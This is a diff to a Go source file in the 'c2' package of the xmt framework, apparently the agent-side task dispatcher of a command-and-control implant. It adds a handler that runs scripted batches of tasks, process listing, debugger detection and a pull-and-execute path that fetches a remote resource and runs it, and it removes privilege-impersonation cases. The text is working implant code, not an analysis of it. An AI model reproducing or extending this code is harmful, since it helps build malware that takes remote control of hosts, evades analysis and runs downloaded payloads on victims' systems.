@@ -2,6 +2,7 @@ package c2
 
 import (
 	"context"
+	"io"
 	"io/fs"
 	"os"
 	"syscall"
@@ -19,6 +20,8 @@ import (
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
+const fourOhFour = "0x404"
+
 var (
 	_ runnable = (*cmd.DLL)(nil)
 	_ runnable = (*cmd.Zombie)(nil)
@@ -26,6 +29,90 @@ var (
 	_ runnable = (*cmd.Assembly)(nil)
 )
 
+func wrapScript(s *Session, n *com.Packet) {
+	var (
+		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
+		err = runScript(s, n, r)
+	)
+	if n.Clear(); err != nil {
+		if r.Clear(); cout.Enabled {
+			s.log.Error("[%s/MuX/ScR] Error during Job %d runtime: %s!", s.ID, n.Job, err)
+		}
+		r.Flags |= com.FlagError
+		r.WriteString(err.Error())
+	}
+	if err = s.write(false, r); err != nil {
+		if r.Clear(); cout.Enabled {
+			s.log.Error("[%s/Mux/ScR] Received error sending Task results: %s!", s.ID, err)
+		}
+	}
+}
+func runScript(s *Session, n, w *com.Packet) error {
+	e, err := n.Bool()
+	if err != nil {
+		return err
+	}
+	var o bool
+	if err = n.ReadBool(&o); err != nil {
+		return err
+	}
+	var (
+		b = buffers.Get().(*data.Chunk)
+		d []byte
+		k bool
+		v com.Packet
+	)
+	for err = nil; err == nil; b.Reset() {
+		v.Reset()
+		if err = n.ReadUint8(&v.ID); err != nil {
+			break
+		}
+		if err = n.ReadBytes(&d); err != nil && err != io.EOF {
+			break
+		}
+		v.Grow(len(d))
+		v.Write(d)
+		d, err = nil, nil
+		w.WriteUint8(v.ID)
+		if k, err = internalTask(s, &v, b); !k {
+			t := task.Mappings[v.ID]
+			if t == nil {
+				if cout.Enabled {
+					s.log.Warning("[%s/MuX/ScR] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
+				}
+				if e {
+					// Set this so we set an error and return something.
+					err = os.ErrNotExist
+					break
+				}
+				w.WriteBool(false)
+				w.WriteString(fourOhFour)
+				continue
+			}
+			err = t(s.ctx, &v, b)
+		}
+		if err != nil {
+			if e {
+				break
+			}
+			w.WriteBool(false)
+			w.WriteString(err.Error())
+			continue
+		}
+		if w.WriteBool(true); o && b.Size() > 0 {
+			w.WriteBytes(b.Payload())
+		} else {
+			w.WriteUint8(0)
+		}
+	}
+	b.Clear()
+	v.Clear()
+	n.Clear()
+	if buffers.Put(b); err == io.EOF {
+		return nil
+	}
+	return err
+}
 func defaultClientMux(s *Session, n *com.Packet) bool {
 	if n.ID < task.MvRefresh {
 		return false
@@ -34,20 +121,7 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
 	}
 	if n.ID == task.MvScript {
-		// TODO(dij): Custom handler for "scripts" here.
-		//            Scripts are basically an array list of Packet commands.
-		//            That should be processed just like any other task and ran
-		//            blocking sequentially.
-		//
-		//            Script packet will contain a single flag that will determine
-		//            if:
-		//               - Errors stop execution
-		//               - Results from packets should be returned or ignored
-		//                 - Ignored results will still indicate a yes|no if failed
-		//
-		//            I'm on the fence if we should care about Migrate packets
-		//            NOT being the last packet, since it will invalidate the
-		//            tasks after it.
+		go wrapScript(s, n)
 		return true
 	}
 	if n.ID < RvResult {
@@ -60,7 +134,7 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 			v, err = internalTask(s, n, r)
 		)
 		if v {
-			if err == nil && n.ID == task.MvMigrate {
+			if n.Clear(); err == nil && n.ID == task.MvMigrate {
 				if cout.Enabled {
 					s.log.Info("[%s/Mux] Migrate Job %d returned true, not sending response back!", s.ID, n.Job)
 				}
@@ -72,12 +146,22 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 				}
 				r.Flags |= com.FlagError
 				r.WriteString(err.Error())
+			} else if cout.Enabled {
+				s.log.Debug("[%s/MuX] Task with JobID %d completed!", s.ID, n.Job)
 			}
+			// NOTE(dij): We block here since most of these are critical.
 			s.write(true, r)
 			return true
 		}
 		r.Clear()
 		r = nil
+	}
+	if n.ID == task.TvWait {
+		if cout.Enabled {
+			s.log.Warning("[%s/MuX] Skipping non-Script WAIT Task!", s.ID)
+		}
+		s.write(true, &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID})
+		return true
 	}
 	if t := task.Mappings[n.ID]; t != nil {
 		go executeTask(t, s, n)
@@ -87,7 +171,7 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 		s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
 	}
 	r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
-	r.WriteString("0x404")
+	r.WriteString(fourOhFour)
 	s.write(true, r)
 	return false
 }
@@ -264,17 +348,6 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			return true, err
 		}
 		return true, nil
-	case task.MvElevate:
-		var f filter.Filter
-		if err := f.UnmarshalStream(n); err != nil {
-			return true, err
-		}
-		if f.Empty() {
-			f = filter.Filter{Elevated: filter.True}
-		}
-		return true, device.Impersonate(&f)
-	case task.MvRevSelf:
-		return true, device.RevertToSelf()
 	case task.MvRefresh:
 		if cout.Enabled {
 			s.log.Debug("[%s] Triggering a device refresh.", s.ID)
@@ -301,6 +374,26 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			s.log.Info("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
 		}
 		s.swap = p
+		return true, nil
+	case task.MvProcList:
+		e, err := cmd.Processes()
+		if err != nil {
+			return true, err
+		}
+		if err = w.WriteUint32(uint32(len(e))); err != nil {
+			return true, err
+		}
+		if len(e) == 0 {
+			return true, nil
+		}
+		for i, m := uint32(0), uint32(len(e)); i < m; i++ {
+			if err = e[i].MarshalStream(w); err != nil {
+				return true, err
+			}
+		}
+		return true, nil
+	case task.MvCheckDebug:
+		w.WriteBool(device.IsDebugged())
 		return true, nil
 	}
 	return false, nil
@@ -363,13 +456,17 @@ func readCallable(x context.Context, r data.Reader) (cmd.Runnable, string, error
 		a.Timeout = 0
 		e = a
 	case task.TvPullExecute:
-		if v, err = r.StringVal(); err != nil {
+		var u, q string
+		if err = r.ReadString(&u); err != nil {
+			return nil, "", err
+		}
+		if err = r.ReadString(&q); err != nil {
 			return nil, "", err
 		}
 		// NOTE(dij): We HAVE to set the Context as the parent to avoid
 		//            io locking issues. *shrug* Luckily, the 'Release' function
 		//            does it job!
-		if e, v, err = task.WebResource(x, nil, false, v); err != nil {
+		if e, v, err = task.WebResource(x, nil, false, q, u); err != nil {
 			return nil, "", err
 		}
 	default:
